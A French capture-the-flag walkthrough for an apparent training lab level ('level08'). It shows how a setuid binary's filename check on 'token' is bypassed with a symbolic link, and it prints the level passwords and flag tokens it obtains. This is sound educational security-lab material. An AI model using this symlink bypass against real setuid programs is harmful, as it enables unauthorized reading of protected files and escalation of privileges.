# Level08: Exploit de lien symbolique contre la condition 'token'

> login:password -> *`level08:fiumuikeil55xe9cu4dood66h`*
```
:~$ su level08
Password:fiumuikeil55xe9cu4dood66h
```
---

```
:~$ pwd
/home/user/level08
```

```
:~$ ls -la
...
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
...
```

Le Home contient un binaire et un fichier token:

```
:~$ ./level08
./level08 [file to read]

:~$ cat token
cat: token: Permission denied

:~$ ./level08 token
You may not access 'token'
```

On remarque que le binaire prend en paramétre un fichier et le lis, mais ne peux pas lire le fichier `token`.
Si on utilise la commande `strings level08` :

```
...
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
...
```

On peux donc supposer qu'il ne le lis pas, uniquement parce qu'il porte le non `token`. Nous allons créer un lien symbolique afin que le fichier puisse être lu.

```
:~$ ln -s ~/token /tmp/flag08
:~$ ./level08 /tmp/flag08
quif5eloekouj29ke0vouxean
```

Le fichier `token` a pu être lu grâce à ce lien symbolique, il nous suffit maintenant de nous connecter sur l'user `flag08` avec le résultat obtenu puis de lancer un `getflag`

```
:~$ su flag08
Password:
Don't forget to launch getflag !

:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

Le flag nous permet de se connecter au level09
`level09:25749xKZ8L7DkSCwJkT9dyv6f`